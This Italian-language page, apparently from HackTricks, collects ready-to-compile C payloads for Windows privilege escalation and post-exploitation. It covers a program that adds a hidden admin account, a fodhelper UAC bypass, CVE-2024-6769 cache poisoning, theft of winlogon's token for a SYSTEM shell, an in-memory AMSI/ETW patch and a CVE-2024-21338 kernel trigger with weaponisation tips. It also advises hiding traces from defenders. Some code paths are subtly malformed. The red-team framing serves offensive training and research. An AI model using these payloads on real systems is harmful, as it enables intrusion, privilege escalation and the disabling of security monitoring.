# Payload C per Windows

{{#include ../../banners/hacktricks-training.md}}

Questa pagina raccoglie **piccoli snippet C autonomi** utili durante la Local Privilege Escalation su Windows o il post-exploitation. Ogni payload è progettato per essere **facile da copiare e incollare**, richiede solo l'API di Windows / il runtime C e può essere compilato con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Questi payload presuppongono che il processo disponga già dei privilegi minimi necessari per eseguire l'azione (ad esempio `SeDebugPrivilege`, `SeImpersonatePrivilege` o un contesto con integrità media per un UAC bypass). Sono destinati ad ambienti **red-team o CTF**, in cui lo sfruttamento di una vulnerabilità ha consentito l'esecuzione arbitraria di codice nativo.

---

## Aggiungere un utente amministratore locale
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Quando viene eseguito il binary attendibile **`fodhelper.exe`**, interroga il percorso del registro riportato di seguito **senza filtrare il verbo `DelegateExecute`**. Inserendo il nostro comando sotto quella chiave, un attacker può eseguire un UAC bypass *senza* scrivere un file su disco.<sup>[[1]](#references)</sup>

*Percorso del registro interrogato da `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC minimale che avvia un `cmd.exe` con privilegi elevati:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testato su Windows 10 22H2 e Windows 11 23H2 (patch di luglio 2025). Il bypass funziona ancora perché Microsoft non ha corretto il controllo di integrità mancante nel percorso `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Il remapping dell'unità + activation context cache poisoning funziona ancora sulle build patchate di Windows 10/11 perché `ctfmon.exe` viene eseguito come processo UI attendibile con elevata integrità, che carica senza problemi dal drive `C:` impersonato dal chiamante e riutilizza qualsiasi redirezione DLL memorizzata nella cache da `CSRSS`. L'abuso avviene come segue: reindirizzare `C:` verso uno storage controllato dall'attaccante, inserire un `msctf.dll` trojanizzato, avviare `ctfmon.exe` per ottenere un'elevata integrità, quindi chiedere a `CSRSS` di memorizzare nella cache un manifest che reindirizzi una DLL utilizzata da un binary auto-elevated (ad esempio `fodhelper.exe`), in modo che al successivo avvio erediti il payload senza un prompt UAC.<sup>[[5]](#references)</sup>

Workflow pratico:
1. Preparare un albero `%SystemRoot%\System32` falso e copiare il binary legittimo che si intende hijackare (spesso `ctfmon.exe`).
2. Usare `DefineDosDevice(DDD_RAW_TARGET_PATH)` per rimappare `C:` all'interno del processo, mantenendo `DDD_NO_BROADCAST_SYSTEM` affinché la modifica resti locale.
3. Inserire la DLL e il manifest nell'albero falso, chiamare `CreateActCtx/ActivateActCtx` per inserire il manifest nella activation-context cache, quindi avviare il binary auto-elevated affinché risolva la DLL reindirizzata direttamente nello shellcode.
4. Eliminare la voce della cache (`sxstrace ClearCache`) o riavviare al termine per cancellare le tracce dell'attaccante.

<details>
<summary>C - Helper per fake drive + manifest poison (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Suggerimento per la pulizia: dopo aver ottenuto SYSTEM, esegui `sxstrace Trace -logfile %TEMP%\sxstrace.etl` seguito da `sxstrace Parse` durante i test: se nel log compare il nome del tuo manifest, anche i defender possono vederlo, quindi cambia i path a ogni esecuzione.

---

## Spawn SYSTEM shell tramite token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Se il processo corrente dispone di **entrambi** i privilegi `SeDebug` e `SeImpersonate` (situazione tipica per molti account di servizio), puoi sottrarre il token da `winlogon.exe`, duplicarlo e avviare un processo con privilegi elevati:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Per una spiegazione più approfondita del funzionamento, vedere:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La maggior parte dei moderni engine AV/EDR si basa su **AMSI** ed **ETW** per ispezionare i comportamenti dannosi. Applicare una patch a entrambe le interfacce all'inizio, all'interno del processo corrente, impedisce che i payload basati su script (ad esempio PowerShell, JScript) vengano sottoposti a scansione.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*La patch sopra è process-local; la creazione di una nuova PowerShell dopo averla eseguita avverrà senza ispezione AMSI/ETW.*

---

## Crea un processo figlio come Protected Process Light (PPL)
Richiedi un livello di protezione PPL per un processo figlio al momento della creazione utilizzando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Questa è un'API documentata e avrà esito positivo solo se l'immagine target è firmata per la signer class richiesta (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Livelli usati più comunemente:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Convalida il risultato con Process Explorer/Process Hacker controllando la colonna Protection.

---

## Local Service -> Kernel tramite `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` espone un device object (`\\.\\AppID`) il cui IOCTL di manutenzione dello smart-hash accetta function pointer forniti dall'utente ogni volta che il caller viene eseguito come `LOCAL SERVICE`; Lazarus lo sta abusando per disabilitare PPL e caricare driver arbitrari, quindi i red team dovrebbero avere un trigger già pronto per l'uso in laboratorio.<sup>[[6]](#references)</sup>

Note operative:
- Serve comunque un token `LOCAL SERVICE`. Sottraiamolo da `Schedule` o `WdiServiceHost` usando `SeImpersonatePrivilege`, quindi esegui l'impersonation prima di interagire con il device, in modo che i controlli ACL vadano a buon fine.
- L'IOCTL `0x22A018` si aspetta una struct contenente due callback pointer (query length + read function). Punta entrambi a stub user-mode che preparano un token overwrite o mappano primitive ring-0, ma mantieni i buffer RWX per evitare che KernelPatchGuard vada in crash durante la chain.
- Dopo il successo, esci dall'impersonation e revoca l'handle del device; i defender ora cercano handle `Device\\AppID` imprevisti, quindi chiudilo immediatamente dopo aver ottenuto i privilegi.

<details>
<summary>C - Scheletro del trigger per l'abuso dello smart-hash di `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Correzione minimale per una build weaponized: mappa una sezione RWX con `VirtualAlloc`, copia lì il tuo stub di duplicazione del token, imposta `KernelThunk = section` e, una volta restituito `DeviceIoControl`, dovresti essere SYSTEM anche sotto PPL.

---

## Riferimenti

- [1] [First entry: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
